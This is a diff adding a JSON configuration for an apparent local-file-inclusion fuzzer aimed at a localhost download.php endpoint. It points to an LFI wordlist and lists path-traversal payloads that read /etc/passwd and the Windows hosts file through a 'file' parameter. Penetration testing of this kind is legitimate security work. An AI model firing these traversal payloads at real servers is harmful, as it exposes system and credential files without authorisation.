@@ -1,0 +1,32 @@
+{
+	"destinationURL": "https://127.0.0.1:9000/download.php",
+	"method": "GET",
+	"userAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+	"delayBetweenRequests": 0,
+	"_delayNotes": "The delay between requests adds the number of seconds between payloads sent to the target...",
+	"targetKey": "file",
+	"keyValuePairs": [
+		{
+			"key": "test",
+			"value": "testing"
+		},
+		{
+			"key": "",
+			"value": ""
+		}
+	],
+	"_keyValueNotes": "Leave the Key and Value Blank if you do not want it populated, create more if needed...",
+	"payloadType": "File",
+	"_payloadNotes": "File - Reads a file specified below, List - Pulls the Payload from the list below",
+	"payloadFilename": "/home/thepcn3rd/github/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt",
+	"payloadList": [
+		"instructions.pdf",
+		"..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+		"../../../../etc/passwd",
+		"..%2F..%2F..%2Fetc%2Fpasswd"
+	],
+	"_notesPayloadList": "You will need to escape the slashes with a windows payload",
+	"outputDirectory": "output",
+	"bodySize": 200,
+	"_bodySizeNotes": "If the size of the Body returned is greater than the bodySize download it to the outputDirectory"
+}
